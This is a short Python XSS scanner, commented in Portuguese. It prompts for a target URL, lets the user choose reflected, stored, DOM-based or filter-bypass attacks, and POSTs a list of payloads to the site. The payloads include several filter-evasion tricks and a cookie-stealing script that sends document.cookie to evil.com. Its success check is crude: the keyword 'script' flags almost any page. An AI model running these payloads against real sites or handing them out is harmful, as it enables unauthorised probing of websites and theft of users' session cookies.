import requests

# URL alvo
url = input("Digite aqui o site alvo: ")

# Wordlist com possíveis indicações de XSS bem-sucedido
success_keywords = [
    "alert(", "XSS", "hacked", "script", "onerror", "onload", "confirm(", "<svg", "payload"
]

# Opções de ataques XSS
attacks = {
    "1": "XSS Refletido",
    "2": "XSS Armazenado",
    "3": "XSS DOM-Based",
    "4": "Bypass de filtros comuns"
}

# Exibe opções para o usuário escolher
print("\nEscolha o tipo de XSS para testar:")
for key, value in attacks.items():
    print(f"[{key}] {value}")

choice = input("\nDigite o número do ataque desejado: ")

# Dicionário de payloads baseados na escolha do usuário
payloads_dict = {
    "1": [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
    ],
    "2": [
        "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<marquee onstart=alert('XSS')>XSS</marquee>"
    ],
    "3": [
        "javascript:alert('XSS')",
        "<script>eval('alert(\"XSS\")')</script>",
        "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
    ],
    "4": [
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        "<scri%00pt>alert('XSS')</scri%00pt>",
        "<img src=x oNERror=alert('XSS')>",
        "<scr<script>ipt>alert&lpar;'XSS'&rpar;</scr<script>ipt>"
    ]
}

# Obtém a lista de payloads com base na escolha do usuário
payloads = payloads_dict.get(choice, [])

if not payloads:
    print("[-] Opção inválida!")
    exit()

# Testa cada payload escolhido
for payload in payloads:
    data = {"input": payload}
    response = requests.post(url, data=data)
    
    response_text = response.text.lower()

    if any(word.lower() in response_text for word in success_keywords):
        print(f"\n[+] XSS encontrado com payload: {payload}")
        break
else:
    print("\n[-] Nenhum payload funcionou. O site pode estar protegido.")
